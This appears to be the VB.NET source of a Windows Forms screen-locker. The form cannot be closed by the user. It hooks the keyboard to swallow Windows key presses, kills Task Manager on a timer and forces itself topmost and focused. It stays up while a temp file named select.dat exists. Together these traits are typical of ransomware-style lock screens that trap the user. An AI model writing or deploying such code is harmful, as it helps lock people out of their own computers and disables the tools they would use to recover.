Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Windows.Forms

Public Class Form1
    Inherits Form
    Private keyPressAltF4 As Boolean = False

    Private Const KEYEVENTF_EXTENDEDKEY As Long = 1L

    Private Const KEYEVENTF_KEYUP As Long = 2L

    Private Const VK_LWIN As Byte = 91

    Private Const WH_KEYBOARD_LL As Integer = 13

    Private Const WM_KEYUP As Integer = 257

    Private Shared _proc As LowLevelKeyboardProc

    Private Shared _hookID As IntPtr


    Private Enum SW As Int32
        Hide = 0
        Normal = 1
        ShowMinimized = 2
        ShowMaximized = 3
        ShowNoActivate = 4
        Show = 5
        Minimize = 6
        ShowMinNoActive = 7
        ShowNA = 8
        Restore = 9
        ShowDefault = 10
        ForceMinimize = 11
        Max = 11
    End Enum


    Shared Sub New()
        _proc = New LowLevelKeyboardProc(AddressOf HookCallback)
        _hookID = IntPtr.Zero
    End Sub



    Public Shared Function HookCallback(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
        If (nCode >= 0 And (wParam = DirectCast(257, Integer))) Then
            Dim key As Keys = DirectCast(Marshal.ReadInt32(lParam), Keys)
            If (key = Keys.LWin Or key = Keys.RWin) Then
                Try
                    keybd_event(251, 0, CLng(1), CLng(0))
                Catch exception As System.Exception
                    ProjectData.SetProjectError(exception)
                    ProjectData.ClearProjectError()
                End Try
            End If
        End If
        Return CallNextHookEx(_hookID, nCode, wParam, lParam)
    End Function

    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As FormClosedEventArgs)
        UnhookWindowsHookEx(_hookID)
    End Sub

    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Shared Function FindWindow(
        ByVal lpClassName As String,
        ByVal lpWindowName As String) As IntPtr
    End Function

    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Shared Function ShowWindow(
        ByVal hwnd As IntPtr,
        ByVal nCmdShow As Int32) As Boolean
    End Function

    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        'prevent alt + f4 on the form
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.BringToFront()

    End Sub

    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then

            e.Cancel = True


        End If

    End Sub

    <DllImport("user32.dll", CharSet:=CharSet.Auto, ExactSpelling:=False, SetLastError:=True)>
    Public Shared Function CallNextHookEx(ByVal hhk As IntPtr, ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function

    <DllImport("user32", CharSet:=CharSet.Ansi, ExactSpelling:=True, SetLastError:=True)>
    Private Shared Sub keybd_event(ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)
    End Sub

    <DllImport("kernel32.dll", CharSet:=CharSet.Auto, ExactSpelling:=False, SetLastError:=True)>
    Public Shared Function GetModuleHandle(ByRef lpModuleName As String) As IntPtr
    End Function

    Private Shared Function SetHook(ByVal proc As LowLevelKeyboardProc) As System.IntPtr
        Dim moduleName As String = Process.GetCurrentProcess().MainModule.ModuleName
        Dim intPtr As System.IntPtr = SetWindowsHookEx(13, proc, GetModuleHandle(moduleName), 0)
        Return intPtr
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, ExactSpelling:=False, SetLastError:=True)>
    Public Shared Function SetWindowsHookEx(ByVal idHook As Integer, ByVal lpfn As LowLevelKeyboardProc, ByVal hMod As IntPtr, ByVal dwThreadId As UInteger) As IntPtr
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, ExactSpelling:=False, SetLastError:=True)>
    Public Shared Function UnhookWindowsHookEx(ByVal hhk As IntPtr) As IntPtr
    End Function

    Public Delegate Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim process As Process
        For Each process In Process.GetProcessesByName("taskmgr")
            Try
                process.Kill()
            Catch ex As Exception
            End Try
        Next
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If File.Exists(IO.Path.GetTempPath & "select.dat") Then


            Debug.Write("nothing")
        Else


            Application.Exit()
            Environment.Exit(1)
            Shell("taskkill /f /im " & IO.Path.GetFileNameWithoutExtension(Application.ExecutablePath) & ".exe")

        End If
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Me.Activate()
        Me.Focus()
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        Me.TopMost = True
    End Sub
End Class
